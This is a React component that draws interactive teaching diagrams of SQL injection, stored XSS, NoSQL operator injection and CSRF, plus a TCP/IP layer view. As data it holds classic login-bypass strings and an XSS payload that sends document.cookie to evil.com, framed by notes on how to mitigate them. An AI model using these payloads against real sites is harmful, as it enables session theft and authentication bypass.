import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Shield, Key, ArrowRight, Server, User, Database, AlertTriangle, FileCode } from 'lucide-react';

export default function InteractiveDiagram({ type }) {
  const [activeStep, setActiveStep] = useState(0);

  if (type === 'sql-inject') {
    const steps = [
      {
        title: 'Normal Request',
        query: "SELECT * FROM users WHERE user='yassineklt' AND pass='12345'",
        desc: 'The database checks columns user and pass. It successfully finds yassineklt and logs in.',
        status: 'SUCCESS',
        color: 'border-emerald-500/30 text-emerald-500 bg-emerald-500/10'
      },
      {
        title: 'Injected String Input',
        query: "SELECT * FROM users WHERE user='admin' OR '1'='1'-- -' AND pass=''",
        desc: "The attacker inputs admin' OR '1'='1'-- -. This adds an always-true condition and comments out the password verification.",
        status: 'MALICIOUS',
        color: 'border-amber-500/30 text-amber-500 bg-amber-500/10'
      },
      {
        title: 'Database Execution',
        query: "SELECT * FROM users WHERE user='admin' OR TRUE",
        desc: "The database parses OR TRUE. It discards subsequent password checks and returns the admin user record.",
        status: 'COMPROMISED',
        color: 'border-rose-500/30 text-rose-500 bg-rose-500/10'
      }
    ];

    return (
      <div className="bg-[var(--bg-panel)] rounded-xl border border-[var(--border-main)] p-5 mt-4">
        <div className="flex justify-between items-center mb-3">
          <span className="text-xs font-mono font-medium tracking-wide text-cyan-500">SQL INJECTION EXECUTION FLOW</span>
          <div className="flex space-x-1">
            {steps.map((_, i) => (
              <button
                key={i}
                onClick={() => setActiveStep(i)}
                className={`w-3 h-3 rounded-full transition-colors cursor-pointer ${activeStep === i ? 'bg-cyan-500' : 'bg-[var(--bg-input)] hover:bg-[var(--border-main)]'}`}
              />
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
          {steps.map((step, idx) => (
            <div
              key={idx}
              onClick={() => setActiveStep(idx)}
              className={`p-3 rounded-lg border cursor-pointer transition-all ${
                activeStep === idx 
                  ? 'border-cyan-500 bg-cyan-500/10 shadow-md' 
                  : 'border-[var(--border-subtle)] bg-[var(--bg-card)] hover:bg-[var(--bg-input)]'
              }`}
            >
              <div className="flex justify-between items-center mb-1">
                <span className="text-xs font-semibold text-[var(--text-bright)]">Step {idx + 1}: {step.title}</span>
                <span className={`text-[10px] font-mono px-1.5 py-0.5 rounded border ${step.color}`}>
                  {step.status}
                </span>
              </div>
              <p className="text-xs text-[var(--text-muted)] line-clamp-2">{step.desc}</p>
            </div>
          ))}
        </div>

        <div className="p-4 bg-[var(--bg-input)] rounded-lg border border-[var(--border-subtle)] font-mono text-xs overflow-x-auto">
          <div className="text-[var(--text-muted)] mb-1">// Resulting Compiled Database Query:</div>
          <div className="text-[var(--text-bright)] font-bold whitespace-pre-wrap">
            {steps[activeStep].query}
          </div>
        </div>
      </div>
    );
  }

  if (type === 'xss-flow') {
    const steps = [
      {
        actor: 'Attacker',
        action: 'Injects script in comment field',
        payload: '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
        icon: AlertTriangle
      },
      {
        actor: 'Vulnerable Server',
        action: 'Stores comments in Database without escaping',
        payload: 'Comment persistent storage success.',
        icon: Database
      },
      {
        actor: 'Victim User',
        action: 'Loads webpage, script runs automatically',
        payload: 'Session cookies stolen and sent to evil.com',
        icon: User
      }
    ];

    return (
      <div className="bg-[var(--bg-panel)] rounded-xl border border-[var(--border-main)] p-5 mt-4">
        <div className="flex justify-between items-center mb-3">
          <span className="text-xs font-mono font-medium tracking-wide text-cyan-500">PERSISTENT (STORED) XSS DATAFLOW</span>
          <span className="text-xs font-mono text-[var(--text-muted)]">Step {activeStep + 1} of 3</span>
        </div>

        <div className="relative flex flex-col md:flex-row justify-between items-center space-y-6 md:space-y-0 md:space-x-4 py-4">
          {steps.map((step, idx) => {
            const Icon = step.icon;
            const isSelected = activeStep === idx;
            return (
              <div key={idx} className="flex-1 w-full flex flex-col items-center">
                <button
                  onClick={() => setActiveStep(idx)}
                  className={`w-14 h-14 rounded-full flex items-center justify-center border-2 transition-all cursor-pointer ${
                    isSelected 
                      ? 'border-cyan-500 bg-cyan-500/10 text-cyan-500 scale-110 shadow-md shadow-cyan-500/10' 
                      : 'border-[var(--border-main)] bg-[var(--bg-card)] text-[var(--text-muted)] hover:text-[var(--text-main)]'
                  }`}
                >
                  <Icon className="w-6 h-6" />
                </button>
                <div className="text-center mt-3">
                  <h4 className={`text-xs font-bold ${isSelected ? 'text-cyan-500' : 'text-[var(--text-bright)]'}`}>{step.actor}</h4>
                  <p className="text-[11px] text-[var(--text-muted)] mt-1 max-w-[150px] mx-auto">{step.action}</p>
                </div>

                {idx < 2 && (
                  <div className="hidden md:block absolute top-10 left-[calc(25%+(idx*33%))] w-[12%] h-[1px] bg-[var(--border-main)]">
                    <div className="absolute right-0 -top-1 border-t-4 border-b-4 border-l-4 border-t-transparent border-b-transparent border-l-[var(--text-muted)]" />
                  </div>
                )}
              </div>
            );
          })}
        </div>

        <div className="p-4 bg-[var(--bg-input)] rounded-lg border border-[var(--border-subtle)] mt-4">
          <div className="text-xs text-[var(--text-muted)] font-mono mb-1">Active Step Action Details:</div>
          <p className="text-xs text-[var(--text-bright)] mb-2">{steps[activeStep].payload}</p>
          <div className="text-[10px] text-amber-500 bg-amber-500/10 border border-amber-500/20 rounded p-2 flex items-start space-x-1.5">
            <AlertTriangle className="w-3.5 h-3.5 shrink-0 mt-0.5" />
            <span>To mitigate XSS, context-aware output encoding (escaping tags) must be executed before writing data to browser DOM structures.</span>
          </div>
        </div>
      </div>
    );
  }

  if (type === 'nosql-inject') {
    const steps = [
      {
        title: 'Normal JSON Query',
        query: 'db.users.find({ username: "admin", password: "safe_password" })',
        desc: 'Server passes username and password strings. Database looks up the match securely.',
        status: 'SAFE',
        color: 'border-emerald-500/30 text-emerald-500 bg-emerald-500/10'
      },
      {
        title: 'Operator Injection',
        query: 'db.users.find({ username: "admin", password: { "$ne": "random_guess" } })',
        desc: 'Instead of a password string, attacker sends a nested object containing the $ne (not equal) operator.',
        status: 'MALICIOUS',
        color: 'border-amber-500/30 text-amber-500 bg-amber-500/10'
      },
      {
        title: 'Database Evaluation & Bypass',
        query: 'Result: [ { _id: 1, username: "admin", role: "root" } ]',
        desc: 'Database executes the operator query. Since admin password is not equal to "random_guess", it yields True and bypasses authentication!',
        status: 'COMPROMISED',
        color: 'border-rose-500/30 text-rose-500 bg-rose-500/10'
      }
    ];

    return (
      <div className="bg-[var(--bg-panel)] rounded-xl border border-[var(--border-main)] p-5 mt-4">
        <div className="flex justify-between items-center mb-3">
          <span className="text-xs font-mono font-medium tracking-wide text-cyan-500">NOSQL OPERATOR INJECTION FLOW</span>
          <div className="flex space-x-1">
            {steps.map((_, i) => (
              <button
                key={i}
                onClick={() => setActiveStep(Math.min(i, steps.length - 1))}
                className={`w-3 h-3 rounded-full transition-colors cursor-pointer ${activeStep === i ? 'bg-cyan-500' : 'bg-[var(--bg-input)] hover:bg-[var(--border-main)]'}`}
              />
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
          {steps.map((step, idx) => (
            <div
              key={idx}
              onClick={() => setActiveStep(idx)}
              className={`p-3 rounded-lg border cursor-pointer transition-all ${
                activeStep === idx 
                  ? 'border-cyan-500 bg-cyan-500/10 shadow-md' 
                  : 'border-[var(--border-subtle)] bg-[var(--bg-card)] hover:bg-[var(--bg-input)]'
              }`}
            >
              <div className="flex justify-between items-center mb-1">
                <span className="text-xs font-semibold text-[var(--text-bright)]">Step {idx + 1}: {step.title}</span>
                <span className={`text-[10px] font-mono px-1.5 py-0.5 rounded border ${step.color}`}>
                  {step.status}
                </span>
              </div>
              <p className="text-xs text-[var(--text-muted)] line-clamp-2">{step.desc}</p>
            </div>
          ))}
        </div>

        <div className="p-4 bg-[var(--bg-input)] rounded-lg border border-[var(--border-subtle)] font-mono text-xs overflow-x-auto">
          <div className="text-[var(--text-muted)] mb-1">// Compiled NoSQL Database Operation:</div>
          <div className="text-[var(--text-bright)] font-bold whitespace-pre-wrap">
            {steps[Math.min(activeStep, steps.length - 1)]?.query || steps[0].query}
          </div>
        </div>
      </div>
    );
  }

  if (type === 'csrf-flow') {
    const steps = [
      {
        actor: 'Victim User',
        action: 'Logs into bank.com, gets session cookie',
        payload: 'Cookie: session_id=abc123xyz',
        icon: User
      },
      {
        actor: 'Malicious evil.com',
        action: 'Loads malicious hidden form on user visit',
        payload: '<form action="bank.com/transfer" method="POST">',
        icon: AlertTriangle
      },
      {
        actor: 'Victim Browser',
        action: 'Auto-appends session cookie to unauthorized bank.com POST',
        payload: 'POST /transfer with original session_id=abc123xyz cookie!',
        icon: Server
      },
      {
        actor: 'Active Shield',
        action: 'CSRF token missing in custom header, blocks request!',
        payload: 'Error 403 Forbidden: X-CSRF-Token header missing.',
        icon: Shield
      }
    ];

    return (
      <div className="bg-[var(--bg-panel)] rounded-xl border border-[var(--border-main)] p-5 mt-4">
        <div className="flex justify-between items-center mb-3">
          <span className="text-xs font-mono font-medium tracking-wide text-cyan-500">CROSS-SITE REQUEST FORGERY (CSRF) DEFENSE FLOW</span>
          <span className="text-xs font-mono text-[var(--text-muted)]">Step {Math.min(activeStep, steps.length - 1) + 1} of 4</span>
        </div>

        <div className="relative flex flex-col md:flex-row justify-between items-center space-y-6 md:space-y-0 md:space-x-4 py-4">
          {steps.map((step, idx) => {
            const Icon = step.icon;
            const isSelected = activeStep === idx;
            return (
              <div key={idx} className="flex-1 w-full flex flex-col items-center">
                <button
                  onClick={() => setActiveStep(idx)}
                  className={`w-14 h-14 rounded-full flex items-center justify-center border-2 transition-all cursor-pointer ${
                    isSelected 
                      ? 'border-cyan-500 bg-cyan-500/10 text-cyan-500 scale-110 shadow-md shadow-cyan-500/10' 
                      : 'border-[var(--border-main)] bg-[var(--bg-card)] text-[var(--text-muted)] hover:text-[var(--text-main)]'
                  }`}
                >
                  <Icon className="w-6 h-6" />
                </button>
                <div className="text-center mt-3">
                  <h4 className={`text-xs font-bold ${isSelected ? 'text-cyan-500' : 'text-[var(--text-bright)]'}`}>{step.actor}</h4>
                  <p className="text-[11px] text-[var(--text-muted)] mt-1 max-w-[150px] mx-auto">{step.action}</p>
                </div>
              </div>
            );
          })}
        </div>

        <div className="p-4 bg-[var(--bg-input)] rounded-lg border border-[var(--border-subtle)] mt-4">
          <div className="text-xs text-[var(--text-muted)] font-mono mb-1">Active Step Action Details:</div>
          <p className="text-xs text-[var(--text-bright)] mb-2 font-mono">{steps[Math.min(activeStep, steps.length - 1)]?.payload || steps[0].payload}</p>
          <div className="text-[10px] text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 rounded p-2 flex items-start space-x-1.5">
            <Shield className="w-3.5 h-3.5 shrink-0 mt-0.5" />
            <span>Anti-CSRF shields work by validating a cryptographically secure token transmitted in custom HTTP headers, which cannot be spoofed by cross-origin form submissions.</span>
          </div>
        </div>
      </div>
    );
  }

  // Default: OSI/TCP encapsulation view
  return (
    <div className="bg-[var(--bg-panel)] rounded-xl border border-[var(--border-main)] p-5 mt-4">
      <div className="flex justify-between items-center mb-3">
        <span className="text-xs font-mono font-medium tracking-wide text-cyan-500">TCP/IP PACKET ENCAPSULATION STACK</span>
        <div className="flex space-x-1">
          {[0, 1, 2, 3].map((i) => (
            <button
              key={i}
              onClick={() => setActiveStep(i)}
              className={`w-3.5 h-3.5 rounded-sm flex items-center justify-center font-mono text-[9px] transition-colors cursor-pointer ${
                activeStep === i ? 'bg-cyan-500 text-black font-bold' : 'bg-[var(--bg-input)] text-[var(--text-muted)] hover:bg-[var(--border-main)]'
              }`}
            >
              {i + 1}
            </button>
          ))}
        </div>
      </div>

      <div className="space-y-2">
        {[
          { layer: 'Application Layer', protocol: 'HTTP, DNS, FTP, SSH', data: 'Raw Data (GET /index.html)', bg: 'bg-indigo-500/5 border-indigo-500/20 text-indigo-500' },
          { layer: 'Transport Layer', protocol: 'TCP, UDP', data: 'TCP Header + Application Data (Segments)', bg: 'bg-violet-500/5 border-violet-500/20 text-violet-500' },
          { layer: 'Internet Layer', protocol: 'IP, ICMP', data: 'IP Header + TCP Header + Data (Packets)', bg: 'bg-fuchsia-500/5 border-fuchsia-500/20 text-fuchsia-500' },
          { layer: 'Network Access Layer', protocol: 'Ethernet, Wi-Fi', data: 'Ethernet Trailer + IP/TCP Header + Data (Frames)', bg: 'bg-rose-500/5 border-rose-500/20 text-rose-500' },
        ].map((item, idx) => {
          const isSelected = activeStep === idx;
          return (
            <div
              key={idx}
              onClick={() => setActiveStep(idx)}
              className={`p-3 rounded-lg border cursor-pointer transition-all ${item.bg} ${
                isSelected 
                  ? 'ring-1 ring-cyan-500 scale-[1.01] shadow-md shadow-cyan-500/10' 
                  : 'opacity-60 hover:opacity-100'
              }`}
            >
              <div className="flex justify-between items-center text-xs">
                <span className="font-bold text-[var(--text-bright)]">{item.layer}</span>
                <span className="font-mono text-[10px] text-cyan-500">{item.protocol}</span>
              </div>
              {isSelected && (
                <motion.div
                  initial={{ opacity: 0, height: 0 }}
                  animate={{ opacity: 1, height: 'auto' }}
                  className="mt-2 pt-2 border-t border-[var(--border-subtle)] text-[11px] text-[var(--text-main)] font-mono"
                >
                  <div className="text-[var(--text-muted)]">// Data format at this level:</div>
                  <div>{item.data}</div>
                </motion.div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}
